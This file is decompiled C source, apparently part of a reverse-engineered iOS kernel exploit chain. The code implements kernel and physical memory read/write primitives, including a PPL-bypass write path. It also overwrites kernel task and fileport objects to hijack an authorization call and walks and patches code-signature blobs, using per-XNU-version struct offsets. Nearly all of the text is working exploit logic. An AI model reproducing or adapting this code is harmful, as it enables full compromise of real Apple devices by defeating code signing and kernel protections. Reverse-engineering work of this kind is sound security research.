        && (*(uint8_t *)krwCtx & 0x20)) {  // tbnz w8, #5 → bit 5 of krwCtx[0]
        kr = physwritebuf_direct_mapped(krwCtx, paddr1, &zero_val, 4, 0);
    } else {
        kr = dmaFail_physwritebuf_ppl(krwCtx, paddr1, &zero_val, 4);
    }
    if (kr) return kr;

    // Read 8 bytes from vaddr
    uint64_t vaddr_val = 0;
    if (!kreadbuf_universal(krwCtx, vaddr, 8, &vaddr_val, 0))
        return 0x2000F;  // 131087

    // Write (vaddr_val - a3) to paddr2
    kr = physwrite64_maybe(krwCtx, paddr2, vaddr_val - a3);
    if (kr) return kr;

    // Write vaddr to qword60
    kr = physwrite64_maybe(krwCtx, qword60, vaddr);
    if (kr) return kr;

    // IOConnectCallScalarMethod(ioPort, 10, &result_idx, 1, NULL, NULL)
    uint64_t scalar_in = result_idx;
    IOConnectCallScalarMethod(ioPort, 10, &scalar_in, 1, NULL, NULL);

    // Final: restore qword60 → qword58
    return physwrite64_maybe(krwCtx, qword60, qword58);
}
// 2B3CC: variable 'v23' is possibly undefined
// 2B400: variable 'v24' is possibly undefined
// 2B418: variable 'v25' is possibly undefined
// 2B450: variable 'v26' is possibly undefined

//----- (000000000002B464) ----------------------------------------------------
__int64 __fastcall physwrite64_maybe(struct_krwCtx *krwCtx, unsigned __int64 paddr, __int64 value_1)
{
  __int64 value; // [xsp+8h] [xbp-8h] BYREF

  value = value_1;
  if ( krwCtx->xnuVersionPacked >= XNU_VERSION_PACKED(10002, 60, 75, 0, 3) && (krwCtx->flags & KRW_CTX_FLAG_PAC_KERNEL_LAYOUT) != 0 )
    return physwritebuf_direct_mapped(krwCtx, paddr, &value, 8u, 0);
  else
    return dmaFail_physwritebuf_ppl(krwCtx, paddr, &value, 8u);
}

//----- (000000000002B4C8) ----------------------------------------------------
__int64 __fastcall dmaFail_physwritebuf_ppl(struct_krwCtx *krwCtx, __int64 paddr, uint64_t *data, unsigned int size)
{
  vm_size_t v4; // x19
  __int64 result; // x0
  vm_size_t v9; // x23
  __int64 v10; // x8
  void *v11; // x1
  void *__dst; // [xsp+8h] [xbp-38h] BYREF

  __dst = 0;
  v4 = vm_page_size;
  if ( paddr + (unsigned __int64)size > (-(__int64)vm_page_size & paddr) + vm_page_size )
    return 708609;
  v9 = vm_page_mask;
  result = physmap_maybe(krwCtx, (vm_address_t *)&__dst, vm_page_size, paddr);
  if ( !(uint32_t)result )
  {
    v10 = v9 & paddr;
    if ( size == 8 )
    {
      v11 = __dst;
      *(uint64_t *)((char *)__dst + v10) = *data;
    }
    else if ( size == 4 )
    {
      v11 = __dst;
      *(uint32_t *)((char *)__dst + v10) = *(uint32_t *)data;
    }
    else
    {
      memcpy(__dst, data, size);
      v11 = __dst;
    }
    vm_deallocate(mach_task_self_, (vm_address_t)v11, v4);
    return 0;
  }
  return result;
}

//----- (000000000002B5BC) ----------------------------------------------------
__int64 __fastcall necp_ioservice_auth_write(struct_krwCtx *krwCtx, __int64 a2)
{
  unsigned int v4; // w22
  unsigned int v5; // w0
  __int64 v6; // x19
  unsigned __int64 v7; // x0
  mach_vm_address_t someKernelAddress; // x23
  unsigned int v9; // w0
  unsigned int v10; // w24
  int v11; // w0
  int is_the_kwrite64; // w0
  unsigned int v13; // w8
  __int64 v15; // [xsp+8h] [xbp-38h] BYREF

  v4 = krwCtx->iosurfaceObj;
  if ( v4 + 1 <= 1 )
  {
    v5 = (unsigned int)ioservice_get_matching("AppleSEPManager");
    if ( v5 + 1 < 2 )
      return 708625;
    v4 = v5;
    krwCtx->iosurfaceObj = v5;
  }
  v6 = 163856;
  v7 = krwCtx->gap_0x18;
  if ( !v7 )
  {
    v7 = get_task_kobject_addr(krwCtx, v4);
    if ( !v7 )
      return 163854;
    krwCtx->gap_0x18 = v7;
  }
  if ( krwCtx->gap_0x20 )
  {
    v15 = krwCtx->gap_0x20;
    someKernelAddress = v7 + 40;
  }
  else
  {
    someKernelAddress = v7 + 40;
    if ( !kread_physmap_decorated(krwCtx, v7 + 40, (unsigned __int64 *)&v15) )
      return 163855;
    krwCtx->gap_0x20 = v15;
  }
  if ( kwrite64_last_arg(krwCtx, someKernelAddress, a2, 0) )
  {
    v9 = _IOServiceSetAuthorizationID();
    v10 = v9;
    if ( v9 )
    {
      if ( v9 != 53 )
      {
        v10 = (v9 & 0xFFF) | 0x70000000;
        goto LABEL_25;
      }
      if ( krwCtx->gap_0xC )
      {
        krwCtx->gap_0xC = 0;
        v10 = refresh_target_task_port(krwCtx, mach_task_self_, 0, 0);
        krwCtx->gap_0xC = 1;
        if ( v10 )
          goto LABEL_25;
      }
      else
      {
        v10 = refresh_target_task_port(krwCtx, mach_task_self_, 0, 0);
        if ( v10 )
          goto LABEL_25;
      }
      v11 = _IOServiceSetAuthorizationID();
      if ( v11 )
        v10 = (v11 & 0xFFF) | 0x70000000;
      else
        v10 = 0;
    }
LABEL_25:
    is_the_kwrite64 = kwrite64_last_arg(krwCtx, someKernelAddress, v15, 0);
    if ( v10 )
      v13 = v10;
    else
      v13 = 163856;
    if ( is_the_kwrite64 )
      return v10;
    else
      return v13;
  }
  return v6;
}

//----- (000000000002B788) ----------------------------------------------------
__int64 __fastcall posix_spawn_with_sigdefault(const char **a1)
{
  __int64 v1; // x19
  __int64 v3; // x20
  pid_t v5; // w0
  unsigned int v6; // w9
  int v7; // [xsp+0h] [xbp-30h] BYREF
  pid_t v8; // [xsp+4h] [xbp-2Ch] BYREF
  posix_spawn_file_actions_t v9; // [xsp+8h] [xbp-28h] BYREF
  sigset_t v10; // [xsp+14h] [xbp-1Ch] BYREF
  posix_spawnattr_t v11; // [xsp+18h] [xbp-18h] BYREF

  v1 = 708619;
  v11 = 0;
  v9 = 0;
  v7 = -1;
  v8 = -1;
  if ( !a1 || !*a1 || !**a1 )
    return 708609;
  if ( !posix_spawnattr_init(&v11) )
  {
    v10 = -1;
    if ( !posix_spawnattr_setflags(&v11, 7)
      && !posix_spawnattr_setsigdefault(&v11, &v10)
      && !posix_spawnattr_setpgroup(&v11, 0)
      && !posix_spawn_file_actions_init(&v9) )
    {
      if ( posix_spawn_file_actions_addopen(&v9, 0, "/dev/null", 0x20000, 0)
        || posix_spawn_file_actions_addopen(&v9, 1, "/dev/null", 131585, 0)
        || posix_spawn_file_actions_addopen(&v9, 2, "/dev/null", 131585, 0)
        || posix_spawn(&v8, *a1, &v9, &v11, (char *const *)a1, 0) )
      {
        v3 = 708619;
      }
      else
      {
        v3 = 708619;
        do
        {
          v5 = waitpid(v8, &v7, 0);
          if ( v5 == v8 )
          {
            if ( v5 != -1 )
              goto LABEL_26;
            v3 = 0;
          }
          else
          {
            if ( v5 != -1 )
              break;
            __error();
          }
        }
        while ( errno == 4 );
        if ( (uint32_t)v3 )
          goto LABEL_14;
LABEL_26:
        if ( (v7 & 0xFF00) != 0 )
          v6 = 708619;
        else
          v6 = 0;
        if ( (v7 & 0x7F) != 0 )
          v3 = 708619;
        else
          v3 = v6;
      }
LABEL_14:
      posix_spawn_file_actions_destroy(&v9);
      v1 = v3;
    }
    posix_spawnattr_destroy(&v11);
  }
  return v1;
}

//----- (000000000002B94C) ----------------------------------------------------
unsigned __int64 __fastcall walk_task_csblob_chain(
        struct_krwCtx *krwCtx,
        unsigned int a2,
        __int64 *a3,
        unsigned __int8 a4,
        unsigned __int64 *a5)
{
  unsigned __int64 result; // x0
  unsigned __int64 v10; // x23
  unsigned __int64 v12; // x1
  int v13; // w8
  __int64 v14; // x1
  int v15; // w20
  __int64 v16; // x2
  unsigned __int64 xnuVersionPacked; // x9
  __int64 v18; // x8
  bool v19; // cc
  unsigned __int64 v20; // x9
  __int128 *v21; // x10
  unsigned __int64 v22; // x8
  int v24; // w8
  unsigned int v25; // [xsp+0h] [xbp-150h] BYREF
  unsigned int v26; // [xsp+4h] [xbp-14Ch] BYREF
  __int64 address; // [xsp+8h] [xbp-148h] BYREF
  unsigned __int64 v28; // [xsp+10h] [xbp-140h] BYREF
  __int64 v29; // [xsp+18h] [xbp-138h] BYREF
  unsigned __int64 v30; // [xsp+20h] [xbp-130h] BYREF
  __int64 v31; // [xsp+28h] [xbp-128h] BYREF
  __int128 v32; // [xsp+30h] [xbp-120h] BYREF
  __int128 v33; // [xsp+40h] [xbp-110h]
  __int128 v34; // [xsp+50h] [xbp-100h] BYREF
  __int128 v35[9]; // [xsp+60h] [xbp-F0h] BYREF
  __int64 v36; // [xsp+F0h] [xbp-60h]

  v30 = 0;
  v31 = 0;
  v28 = 0;
  v29 = 0;
  address = 0;
  result = kread_task_struct(krwCtx, a2);
  if ( !result )
    return result;
  v10 = result;
  if ( !(unsigned int)get_csblob_offset_pair(krwCtx, (int *)&v31 + 1, (int *)&v31) )
    return 0;
  if ( !kread_physmap_decorated(krwCtx, v10 + HIDWORD(v31), &v30) || v30 == 0 )
    return 0;
  if ( !a3 )
  {
    if ( (unsigned int)krw_read_thunk(krwCtx, v10 + (unsigned int)v31, 8, &v29) )
      goto LABEL_10;
    return 0;
  }
  v29 = *a3;
LABEL_10:
  if ( !(unsigned int)get_csblob_size_pair(krwCtx, &v26, &v25) || !kread_physmap_decorated(krwCtx, v30 + v26, &v28) || !v28 )
    return 0;
  v12 = v28 + v25;
  if ( a5 )
    *a5 = v12;
  v13 = kread_physmap_decorated(krwCtx, v12, (unsigned __int64 *)&address);
  result = 0;
  if ( v13 )
  {
    v14 = address;
    if ( address )
    {
      v15 = a4 & (a3 == 0);
      while ( 1 )
      {
        v36 = 0;
        v34 = 0u;
        memset(v35, 0, sizeof(v35));
        v16 = krwCtx->xnuVersionPacked <= XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) ? 48LL : 64LL;
        v32 = 0u;
        v33 = 0u;
        if ( !(unsigned int)krw_read_thunk(krwCtx, v14, v16, &v32) )
          break;
        xnuVersionPacked = krwCtx->xnuVersionPacked;
        v18 = *((uint64_t *)&v33 + 1);
        if ( xnuVersionPacked > XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) )
          v18 = *((uint64_t *)&v34 + 1);
        if ( v15 )
        {
          if ( (unsigned __int64)(v18 - 0x20000000) <= 0x7FE0000000LL )
            return address;
        }
        else
        {
          v19 = xnuVersionPacked > XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023);
          if ( xnuVersionPacked <= XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) )
            v20 = *((uint64_t *)&v34 + 1);
          else
            v20 = *((uint64_t *)&v35[0] + 1);
          v21 = v35;
          if ( !v19 )
            v21 = &v34;
          v22 = v29 - v18;
          if ( v22 >= *(uint64_t *)v21 && v22 < v20 )
            return address;
        }
        v24 = kread_physmap_decorated(krwCtx, address, (unsigned __int64 *)&address);
        result = 0;
        if ( v24 )
        {
          v14 = address;
          if ( address )
            continue;
        }
        return result;
      }
      return 0;
    }
  }
  return result;
}

//----- (000000000002BBA4) ----------------------------------------------------
__int64 __fastcall get_csblob_offset_pair(struct_krwCtx *krwCtx, int *a2, int *a3)
{
  __int64 result; // x0
  int v5; // w9
  int v7; // w8
  int v8; // w9
  unsigned __int64 v9; // x8

  result = 0LL;
  v5 = krwCtx->xnuMajorVersion;
  if ( v5 <= 8019 )
  {
    switch ( v5 )
    {
      case 6153:
        v7 = 576;
        v8 = 568;
        break;
      case 7195:
        v7 = 552;
        v8 = 544;
        break;
      case 8019:
        v9 = krwCtx->xnuVersionPacked;
        if ( v9 <= XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) )
          v8 = 680;
        else
          v8 = 856;
        if ( v9 <= XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) )
          v7 = 688;
        else
          v7 = 864;
        break;
      default:
        return result;
    }
    goto LABEL_26;
  }
  if ( v5 <= 8795 )
  {
    if ( v5 != 8020 && v5 != 8792 )
      return result;
    v7 = 856;
    v8 = 848;
LABEL_26:
    *a2 = v8;
    *a3 = v7;
    return 1LL;
  }
  if ( v5 == 8796 || v5 == 10002 )
  {
    v7 = 1360;
    v8 = 1352;
    goto LABEL_26;
  }
  return result;
}

//----- (000000000002BC80) ----------------------------------------------------
__int64 __fastcall get_csblob_size_pair(struct_krwCtx *krwCtx, uint32_t *a2, uint32_t *a3)
{
  __int64 result; // x0
  int v5; // w8
  bool v6; // zf
  int v7; // w9

  result = 0LL;
  v5 = krwCtx->xnuMajorVersion;
  if ( v5 > 8791 )
  {
    v6 = v5 == 8792 || v5 == 10002;
    v7 = 8796;
  }
  else
  {
    v6 = (unsigned int)(v5 - 8019) < 2 || v5 == 6153;
    v7 = 7195;
  }
  if ( v6 || v5 == v7 )
  {
    if ( a2 )
      *a2 = 120;
    if ( a3 )
      *a3 = 80;
    return 1LL;
  }
  return result;
}

//----- (000000000002BCF0) ----------------------------------------------------
__int64 __fastcall compute_sha_hash(int a1, const void *a2, CC_LONG a3, void *a4, uint32_t *a5)
{
  size_t v6; // x21
  CC_SHA512_CTX c; // [xsp+8h] [xbp-138h] BYREF
  unsigned __int8 md[48]; // [xsp+D8h] [xbp-68h] BYREF

  if ( (unsigned int)(a1 - 1) > 3 )
    return 0;
  v6 = kHashDigestSizes[a1 - 1];
  if ( *a5 < (unsigned int)v6 )
    return 0;
  if ( (unsigned int)(a1 - 2) < 2 )
  {
    CC_SHA256_Init((CC_SHA256_CTX *)&c);
    CC_SHA256_Update((CC_SHA256_CTX *)&c, a2, a3);
    CC_SHA256_Final(md, (CC_SHA256_CTX *)&c);
    goto LABEL_11;
  }
  if ( a1 == 4 )
  {
    CC_SHA384_Init(&c);
    CC_SHA384_Update(&c, a2, a3);
    CC_SHA384_Final(md, &c);
    goto LABEL_11;
  }
  if ( a1 == 1 )
  {
    CC_SHA1_Init((CC_SHA1_CTX *)&c);
    CC_SHA1_Update((CC_SHA1_CTX *)&c, a2, a3);
    CC_SHA1_Final(md, (CC_SHA1_CTX *)&c);
LABEL_11:
    memcpy(a4, md, v6);
    *a5 = v6;
    return 1;
  }
  return 0;
}

//----- (000000000002BE34) ----------------------------------------------------
__int64 __fastcall cfplist_compare_and_serialize(UInt8 *a1, CFIndex a2, UInt8 *a3, CFIndex a4, uint64_t *a5, uint64_t *a6, uint8_t *a7)
{
  CFErrorRef v12; // x0
  CFErrorRef v13; // x19
  CFErrorRef v14; // x0
  CFErrorRef v15; // x20
  void *v16; // x0
  __int64 v17; // x21
  size_t v19; // [xsp+8h] [xbp-38h] BYREF

  v12 = cfplist_from_bytes(a1, a2);
  if ( !v12 )
    return 0;
  v13 = v12;
  v14 = cfplist_from_bytes(a3, a4);
  if ( v14 )
  {
    v15 = v14;
    if ( cfdict_compare_or_merge(v13, v14, a7) && (v16 = cfplist_serialize_xml(v13, &v19)) != 0 )
    {
      *a6 = v19;
      *a5 = v16;
      v17 = 1;
    }
    else
    {
      v17 = 0;
    }
    CFRelease(v13);
  }
  else
  {
    v17 = 0;
    v15 = v13;
  }
  CFRelease(v15);
  return v17;
}

//----- (000000000002BF00) ----------------------------------------------------
CFErrorRef __fastcall cfplist_from_bytes(UInt8 *bytes, CFIndex length)
{
  struct __CFReadStream *v2; // x0
  struct __CFReadStream *v3; // x19
  struct __CFError *v4; // x0
  CFErrorRef v5; // x20
  CFTypeID v6; // x21
  CFErrorRef error; // [xsp+8h] [xbp-28h] BYREF

  error = 0;
  v2 = CFReadStreamCreateWithBytesNoCopy(kCFAllocatorDefault, bytes, length, kCFAllocatorNull);
  if ( v2 )
  {
    v3 = v2;
    if ( !CFReadStreamOpen(v2) )
    {
      v5 = 0;
      goto LABEL_9;
    }
    v4 = (struct __CFError *)CFPropertyListCreateWithStream(kCFAllocatorDefault, v3, 0, 2u, 0, &error);
    if ( v4 )
    {
      v5 = v4;
      v6 = CFGetTypeID(v4);
      if ( v6 == CFDictionaryGetTypeID() )
      {
LABEL_6:
        CFReadStreamClose(v3);
LABEL_9:
        CFRelease(v3);
        return v5;
      }
    }
    else
    {
      v5 = error;
      if ( !error )
        goto LABEL_6;
    }
    CFRelease(v5);
    v5 = 0;
    goto LABEL_6;
  }
  return 0;
}

#include "entry1_type0x09_csblob.inc"

// 2FA10: variable 'vars8' is possibly undefined

#include "entry1_type0x09_csblob_patch.inc"

//----- (0000000000031914) ----------------------------------------------------
uint32_t *__fastcall csblob_alloc_and_fill_slots(__int64 a1, uint64_t *a2, size_t *a3, unsigned int *a4, unsigned int *a5, unsigned int *a6)
{
  int v10; // w8
  unsigned int *v11; // x9
  __int64 v12; // x8
  unsigned int v13; // w28
  __int64 v14; // x11
  __int64 v15; // x12
  int v16; // w13
  __int64 v18; // x10
  int v19; // w9
  __int64 v20; // x11
  bool v21; // zf
  unsigned int v22; // w12
  unsigned int v23; // w8
  int v24; // w25
  uint32_t *result; // x0
  unsigned int v26; // w10
  bool v27; // cf
  bool v28; // cc
  int v29; // w8
  int v30; // w8
  int v31; // w10
  size_t v32; // x21
  uint32_t *v33; // x26
  unsigned int *v34; // x20
  unsigned int v35; // w8
  __int64 v36; // x21
  unsigned __int64 v37; // x22
  __int64 v38; // x8
  uint32_t *v39; // x19
  unsigned int v40; // w25
  int v41; // w9
  unsigned int *v42; // x10
  __int64 v43; // x8
  unsigned int *v44; // x1
  size_t v45; // x27
  bool v46; // zf
  int v47; // w9
  size_t v48; // [xsp+8h] [xbp-78h]
  uint64_t *v49; // [xsp+10h] [xbp-70h]
  size_t *v50; // [xsp+18h] [xbp-68h]

  v10 = *(uint32_t *)(a1 + 48);
  if ( v10 )
  {
    if ( v10 != 1 )
      return 0;
    v11 = *(unsigned int **)(a1 + 56);
    v12 = *v11;
    if ( (uint32_t)v12 )
    {
      v13 = 0;
      v14 = *((uint64_t *)v11 + 1) + 8LL;
      v15 = *v11;
      do
      {
        if ( *(uint32_t *)(v14 - 8) == *(uint32_t *)(a1 + 64) )
        {
          v16 = *(uint32_t *)(*(uint64_t *)v14 + 40LL);
          if ( (v16 & 0x3FFF) == 0 && v16 != 0 )
            v13 = *(uint32_t *)(*(uint64_t *)v14 + 40LL);
        }
        v14 += 16;
        --v15;
      }
      while ( v15 );
      v18 = *((uint64_t *)v11 + 1) + 8LL;
      v19 = 12;
      v20 = v12;
      do
      {
        v21 = *(uint32_t *)(v18 - 8) != 5 || v13 == 0;
        v22 = v13;
        if ( v21 )
          v22 = bswap32(*(uint32_t *)(*(uint64_t *)v18 + 4LL));
        v19 += 8 + v22;
        v18 += 16;
        --v20;
      }
      while ( v20 );
    }
    else
    {
      v13 = 0;
      v19 = 12;
    }
    v26 = *(uint32_t *)(a1 + 92);
    v27 = v26 >= (unsigned int)v12;
    v29 = v26 - v12;
    v28 = v29 != 0 && v27;
    v30 = 8 * v29;
    if ( v28 )
      v31 = v30;
    else
      v31 = 0;
    v23 = v31 + v19;
    v24 = v31 + 12;
  }
  else
  {
    v13 = 0;
    v23 = bswap32(*(uint32_t *)(*(uint64_t *)(a1 + 56) + 4LL));
    v24 = 12;
  }
  v32 = v23;
  result = malloc(v23);
  if ( result )
  {
    v33 = result;
    bzero(result, v32);
    if ( *(uint32_t *)(a1 + 48) == 1 )
    {
      v49 = a2;
      v50 = a3;
      v34 = *(unsigned int **)(a1 + 56);
      *v33 = -1072898310;
      v35 = bswap32(*v34);
      v48 = v32;
      v33[1] = bswap32(v32);
      v33[2] = v35;
      if ( *v34 )
      {
        v36 = 0;
        v37 = 0;
        v38 = *((uint64_t *)v34 + 1);
        v39 = v33 + 4;
        v40 = v24 + 8 * *v34;
        while ( 1 )
        {
          v41 = *(uint32_t *)(v38 + v36);
          if ( v41 == *(uint32_t *)(a1 + 64) )
          {
            *a4 = v40;
            v41 = *(uint32_t *)(v38 + v36);
          }
          v42 = a5;
          if ( v41 == 5 )
            goto LABEL_37;
          if ( v41 == 7 )
            break;
LABEL_38:
          v43 = v38 + v36;
          *(v39 - 1) = bswap32(*(uint32_t *)v43);
          *v39 = bswap32(v40);
          v44 = *(unsigned int **)(v43 + 8);
          v45 = bswap32(v44[1]);
          memcpy((char *)v33 + v40, v44, v45);
          v38 = *((uint64_t *)v34 + 1);
          if ( v13 )
            v46 = *(uint32_t *)(v38 + v36) == 5;
          else
            v46 = 0;
          if ( v46 )
            v47 = v13;
          else
            v47 = v45;
          v40 += v47;
          ++v37;
          v36 += 16;
          v39 += 2;
          if ( v37 >= *v34 )
            goto LABEL_45;
        }
        v42 = a6;
LABEL_37:
        *v42 = v40;
        goto LABEL_38;
      }
LABEL_45:
      *v49 = v33;
      *v50 = v48;
      return &def_3E8F0 + 1;
    }
    else
    {
      memcpy(v33, *(const void **)(a1 + 56), bswap32(*(uint32_t *)(*(uint64_t *)(a1 + 56) + 4LL)));
      *a2 = v33;
      *a3 = v32;
      result = &def_3E8F0 + 1;
      *a4 = 0;
    }
  }
  return result;
}
// 0: using guessed type int def_3E8F0;

//----- (0000000000031B90) ----------------------------------------------------
__int64 __fastcall wire_proc_page_via_kobject(struct_krwCtx *krwCtx, __int64 a2, mach_vm_address_t *a3, uint64_t *a4, int *a5)
{
  __int64 v10; // x25
  __int64 v11; // x23
  int v12; // w8
  __int64 v13; // x26
  bool v15; // zf
  __int64 v16; // x24
  int xnuMajorVersion; // w8
  int v19; // w22
  int v21; // w0
  int v22; // w23
  unsigned __int64 v23; // x0
  mach_vm_address_t v24; // x25
  int v25; // w23
  int v27; // [xsp+8h] [xbp-68h] BYREF
  int v28; // [xsp+Ch] [xbp-64h] BYREF
  int v29; // [xsp+10h] [xbp-60h] BYREF
  int v30; // [xsp+14h] [xbp-5Ch] BYREF
  __int64 v31; // [xsp+18h] [xbp-58h] BYREF
  mach_port_name_t name[2]; // [xsp+20h] [xbp-50h] BYREF
  __int64 v33; // [xsp+28h] [xbp-48h] BYREF

  if ( krwCtx->xnuVersionPacked < XNU_VERSION_PACKED(8019, 60, 40, 0, 0) )
  {
    v11 = 0;
    v33 = 0;
    name[0] = 0;
    xnuMajorVersion = krwCtx->xnuMajorVersion;
    if ( xnuMajorVersion <= 8018 )
    {
      if ( xnuMajorVersion != 6153 && xnuMajorVersion != 7195 )
        return v11;
    }
    else if ( (unsigned int)(xnuMajorVersion - 8019) >= 2 && xnuMajorVersion != 8792 )
    {
      return v11;
    }
    v21 = open("/dev/null", 0);
    if ( (v21 & 0x80000000) == 0 )
    {
      v22 = v21;
      if ( !(unsigned int)j__fileport_makeport(v21, name) )
      {
        v23 = get_task_kobject_addr(krwCtx, name[0]);
        if ( v23 )
        {
          v24 = v23 + 56;
          if ( kread_physmap_decorated(krwCtx, v23 + 56, (unsigned __int64 *)&v33) && kwrite64(krwCtx, v24, a2) )
          {
            *a5 = v22;
            *a3 = v24;
            *a4 = v33;
            mach_port_destroy(mach_task_self_, name[0]);
            return 1;
          }
        }
        mach_port_destroy(mach_task_self_, name[0]);
      }
      close(v22);
    }
    return 0;
  }
  v10 = 0;
  v11 = 0;
  *a3 = 0;
  *a4 = 0;
  *(uint64_t *)name = 0;
  v33 = 0;
  v31 = 0;
  v29 = -1;
  v30 = -1;
  v27 = -1;
  v28 = -1;
  v12 = krwCtx->xnuMajorVersion;
  v13 = 72;
  if ( v12 > 8791 )
  {
    v16 = 0;
    if ( v12 != 8792 )
    {
      if ( v12 != 10002 && v12 != 8796 )
        return v11;
      v16 = 116;
      v10 = 64;
      v13 = 80;
    }
  }
  else
  {
    v15 = (unsigned int)(v12 - 8019) < 2 || v12 == 6153 || v12 == 7195;
    v16 = 0;
    if ( !v15 )
      return v11;
  }
  v19 = open("/private/etc/passwd", 0);
  if ( v19 < 0 )
  {
LABEL_27:
    v11 = 0;
    if ( v19 == -1 )
      return v11;
  }
  else
  {
    while ( !(unsigned int)validate_port_set_chain(krwCtx, v19, &v33) && kread_u32(krwCtx, v33 + 84, &v30) )
    {
      if ( (v30 & 0x4000) != 0 )
      {
        if ( kread_physmap_decorated(krwCtx, v33 + 64, (unsigned __int64 *)&v31)
          && validate_kaddr_range(krwCtx, v31)
          && kread_physmap_decorated(krwCtx, v31 + v13, (unsigned __int64 *)name)
          && validate_kaddr_range(krwCtx, *(__int64 *)name)
          && (krwCtx->xnuMajorVersion < 8796
           || (kread_u32(krwCtx, v33 + v16, &v28)
           && kread_u32(krwCtx, v31 + v10, &v27)
           && kread_u32(krwCtx, v16 + a2, &v29)
           && noppl_kwrite32(krwCtx, v31 + v10, v29)
           && noppl_kwrite32(krwCtx, v33 + v16, v29)))
          && kwrite64(krwCtx, v31 + v13, a2) )
        {
          v25 = open("/private/etc/passwd", 0);
          if ( kwrite64(krwCtx, v31 + v13, *(__int64 *)name)
            && (krwCtx->xnuMajorVersion < 8796
             || (noppl_kwrite32(krwCtx, v33 + v16, v28) && noppl_kwrite32(krwCtx, v31 + v10, v27)))
            && (v25 & 0x80000000) == 0 )
          {
            if ( !(unsigned int)validate_port_set_chain(krwCtx, v25, &v33) && v33 == a2 )
            {
              *a5 = v25;
              v11 = 1;
              goto LABEL_65;
            }
          }
          else if ( v25 == -1 )
          {
            break;
          }
          close(v25);
        }
        break;
      }
      if ( !noppl_kwrite32(krwCtx, v33 + 84, v30 | 0x4000) )
        break;
      close(v19);
      v19 = open("/private/etc/passwd", 0);
      if ( v19 < 0 )
        goto LABEL_27;
    }
    v11 = 0;
  }
LABEL_65:
  close(v19);
  return v11;
}

//----- (0000000000031FC0) ----------------------------------------------------
__int64 __fastcall csblob_compute_and_copy_hash(struct csblob_walk_ctx *ctx, void *outHash)
{
  __int64 result; // x0
  unsigned int __n; // [xsp+4h] [xbp-4Ch] BYREF
  uint8_t __n_4[48]; // [xsp+8h] [xbp-48h] BYREF

  result = (__int64)csblob_find_entry(ctx, ctx->selectedSlot, -86111230);
  if ( result )
  {
    __n = 48;
    result = compute_sha_hash(
               *(unsigned __int8 *)(result + 37),
               (const void *)result,
               bswap32(*(uint32_t *)(result + 4)),
               __n_4,
               &__n);
    if ( (uint32_t)result )
    {
      memcpy(outHash, __n_4, __n);
      return 1;
    }
  }
  return result;
}

//----- (0000000000032064) ----------------------------------------------------
__int64 __fastcall physmap_kwrite_chain_entry(
        struct_krwCtx *krwCtx,
        unsigned __int64 a2,
        unsigned int a3,
        const void *a4,
        mach_vm_size_t a5)
{
  __int64 result; // x0
  unsigned __int64 v10; // x8
  unsigned __int64 v11; // [xsp+8h] [xbp-28h] BYREF

  result = kread_physmap_decorated(krwCtx, a2, &v11);
  if ( (uint32_t)result )
  {
    v10 = v11;
    while ( 1 )
    {
      result = kwritebuf_universal(krwCtx, v10 + a3, a4, a5);
      if ( !(uint32_t)result )
        break;
      result = kread_physmap_decorated(krwCtx, v11, &v11);
      if ( !(uint32_t)result )
        break;
      v10 = v11;
      if ( !v11 )
        return 1;
    }
  }
  return result;
}

//----- (00000000000320EC) ----------------------------------------------------
__int64 __fastcall get_version_specific_offset(struct_krwCtx *krwCtx)
{
  int has_flag; // w0
  int xnuMajorVersion; // w8
  unsigned int v4; // w10
  unsigned int v6; // w10
  unsigned int v7; // w11
  unsigned int v8; // w11
  unsigned int v9; // w10

  has_flag = krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A12_A13_A14_A15_A16_A17_MASK);
  xnuMajorVersion = krwCtx->xnuMajorVersion;
  if ( (unsigned int)(xnuMajorVersion - 8019) < 2 )
  {
    if ( has_flag )
      v6 = 216;
    else
      v6 = 208;
    if ( has_flag )
      v7 = 200;
    else
      v7 = 192;
    if ( krwCtx->xnuVersionPacked >= XNU_VERSION_PACKED(8019, 60, 40, 0, 0) )
      return v7;
    else
      return v6;
  }
  else if ( xnuMajorVersion == 7195 )
  {
    if ( has_flag )
      v8 = 176;
    else
      v8 = 168;
    if ( has_flag )
      v9 = 184;
    else
      v9 = 176;
    if ( krwCtx->xnuVersionPacked >= XNU_VERSION_PACKED(7195, 100, 326, 0, 0) )
      return v9;
    else
      return v8;
  }
  else
  {
    if ( has_flag )
      v4 = 184;
    else
      v4 = 176;
    if ( xnuMajorVersion == 6153 )
      return v4;
    else
      return 0;
  }
}

//----- (00000000000321C0) ----------------------------------------------------
__int64 __fastcall get_dyld_slide_info(struct_krwCtx *krwCtx)
{
  int v1; // w0
  int v2; // w19
  __int64 v3; // x20
  int v4; // w19
  int v5; // w8
  int v7; // [xsp+Ch] [xbp-54h] BYREF
  uint64_t v8[7]; // [xsp+10h] [xbp-50h] BYREF

  v7 = 0;
  v8[0] = (unsigned int)(0x20000000 - krwCtx->pageSizeOrSomething);
  v8[1] = &v7;
  v8[2] = 4;
  v1 = open("/usr/lib/dyld", 0);
  if ( v1 < 0 )
  {
    v4 = errno;
    v5 = errno;
    if ( v4 < 0 )
      v5 = -v5;
    return v5 | 0x40000000u;
  }
  else
  {
    v2 = v1;
    if ( fcntl(v1, 59, v8) && errno == 85 )
      v3 = 0;
    else
      v3 = 4097;
    close(v2);
  }
  return v3;
}

//----- (00000000000322A4) ----------------------------------------------------
__int64 __fastcall spinlock_acquire_clear_bit(__int64 a1)
{
  uint32_t *v1; // x8

  v1 = *(uint32_t **)(a1 + 24);
  *(uint8_t *)a1 = 1;
  while ( (*v1 & 0x4000000) == 0 )
  {
    if ( *(uint8_t *)(a1 + 1) )
      return 0;
  }
  *v1 &= ~0x4000000u;
  __dsb(0xBu);
  return 0;
}

//----- (00000000000322D8) ----------------------------------------------------
__int64 __fastcall dyld_fcntl59_mmap_setup(struct_krwCtx *krwCtx, int *a2)
{
  int v2; // w8
  uint64_t payload[112 / sizeof(uint64_t)]; // [xsp+10h] [xbp-B0h] BYREF
  uint64_t v13[7]; // [xsp+80h] [xbp-40h] BYREF

  v2 = *a2;
  memset(payload, 0, sizeof(payload));
  payload[0] = 0x70000000020CDEFALL;
  payload[1] = 0x20200u;
  payload[4] = 0x22000000000LL;
  *((uint8_t *)payload + 0x27) = vm_page_shift;
